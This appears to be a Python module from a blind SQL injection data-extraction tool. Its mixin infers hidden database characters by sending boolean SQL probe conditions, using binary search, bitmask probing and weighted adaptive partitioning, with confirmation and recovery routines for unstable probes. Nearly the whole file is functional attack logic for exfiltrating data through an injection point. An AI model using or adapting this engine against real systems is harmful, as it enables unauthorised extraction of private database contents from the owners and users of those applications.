from __future__ import annotations

from .extractor_common import MAX_ADAPTIVE_ALPHABET, ExtractionError


class InferenceAlgorithmsMixin:
    """Exact numeric inference algorithms; never uses LIKE for characters."""

    def _record_code(self, code: int) -> None:
        with self._alphabet_lock:
            self._observed_codes[code] = self._observed_codes.get(code, 0) + 1

    def _code_weight(self, code: int) -> float:
        char = chr(code)
        if "a" <= char <= "z":
            base = 8.0
        elif char == "_":
            base = 7.0
        elif "0" <= char <= "9":
            base = 4.0
        elif "A" <= char <= "Z":
            base = 3.0
        elif char in "-.$%":
            base = 2.0
        else:
            base = 1.0
        with self._alphabet_lock:
            learned = self._observed_codes.get(code, 0)
        return base + learned * 2.5

    def _weighted_partition(self, candidates: list[int]) -> set[int]:
        weighted = sorted(
            ((self._code_weight(code), code) for code in candidates),
            reverse=True,
        )
        target = sum(weight for weight, _ in weighted) / 2
        selected: set[int] = set()
        current = 0.0
        for weight, code in weighted:
            before = abs(current - target)
            after = abs(current + weight - target)
            if not selected or after <= before:
                selected.add(code)
                current += weight
        if len(selected) == len(candidates):
            selected.remove(min(selected, key=self._code_weight))
        return selected

    @staticmethod
    def _numeric_membership_condition(
        code_expression: str,
        codes: set[int],
    ) -> str:
        """Build numeric membership; '%' and '_' never become LIKE patterns."""
        if not codes:
            return "1=0"
        values = ",".join(str(code) for code in sorted(codes))
        return f"({code_expression}) IN ({values})"

    def _confirm_candidate(self, code_expression: str, candidate: int) -> bool:
        self._metric("confirmations")
        condition = f"({code_expression}) = {candidate}"
        first = self.probe_condition(condition)
        if first.matched:
            return True
        if not self.adaptive_confirmation:
            return False
        confirmed, _ = self._stable_condition(condition, initial=first)
        return confirmed

    def _infer_character_binary_fast(
        self,
        code_expression: str,
        position: int,
    ) -> int:
        low = self.config.min_char_code
        high = self.config.max_char_code
        while low < high:
            midpoint = (low + high) // 2
            self._metric("binary_probes")
            if self.probe_condition(
                f"({code_expression}) > {midpoint}"
            ).matched:
                low = midpoint + 1
            else:
                high = midpoint
        if self._confirm_candidate(code_expression, low):
            self._record_code(low)
            self._metric("characters")
            return low
        return self._recover_character(code_expression, position)

    def _infer_character_adaptive(
        self,
        code_expression: str,
        position: int,
    ) -> int:
        size = self.config.max_char_code - self.config.min_char_code + 1
        if size > MAX_ADAPTIVE_ALPHABET:
            return self._infer_character_binary_fast(code_expression, position)

        candidates = list(
            range(self.config.min_char_code, self.config.max_char_code + 1)
        )
        while len(candidates) > 1:
            selected = self._weighted_partition(candidates)
            self._metric("partition_probes")
            condition = self._numeric_membership_condition(
                code_expression,
                selected,
            )
            matched = self.probe_condition(condition).matched
            candidates = [
                code for code in candidates if (code in selected) == matched
            ]
        candidate = candidates[0]
        if self._confirm_candidate(code_expression, candidate):
            self._record_code(candidate)
            self._metric("characters")
            return candidate
        return self._recover_character(code_expression, position)

    def _recover_character(self, code_expression: str, position: int) -> int:
        """Use robust probes without restarting the complete inference repeatedly."""
        self._metric("fallbacks")
        minimum = self.config.min_char_code
        maximum = self.config.max_char_code
        in_range, _ = self._stable_condition(
            f"({code_expression}) BETWEEN {minimum} AND {maximum}"
        )
        if not in_range:
            raise ExtractionError(
                f"Character at position {position} is outside configured "
                f"range {minimum}..{maximum}."
            )

        low, high = minimum, maximum
        while low < high:
            midpoint = (low + high) // 2
            greater, _ = self._stable_condition(
                f"({code_expression}) > {midpoint}"
            )
            if greater:
                low = midpoint + 1
            else:
                high = midpoint
        equal, _ = self._stable_condition(f"({code_expression}) = {low}")
        if not equal:
            raise ExtractionError(
                f"Unable to confirm character at position {position}."
            )
        self._record_code(low)
        self._metric("characters")
        self._emit("inference.recovered", position=position, candidate=low)
        return low

    def _infer_character_code(self, code_expression: str, position: int) -> int:
        self.control.checkpoint()
        if self.inference_mode == "binary":
            return self._infer_character_binary_fast(code_expression, position)
        if self.inference_mode == "adaptive":
            return self._infer_character_adaptive(code_expression, position)

        bits = max(1, self.config.max_char_code.bit_length())
        candidate = 0
        for bit in range(bits):
            mask = 1 << bit
            self._metric("bit_probes")
            condition = f"(({code_expression}) & {mask}) <> 0"
            if self.probe_condition(condition).matched:
                candidate |= mask
        in_range = self.config.min_char_code <= candidate <= self.config.max_char_code
        if in_range and self._confirm_candidate(code_expression, candidate):
            self._record_code(candidate)
            self._metric("characters")
            return candidate
        return self._recover_character(code_expression, position)
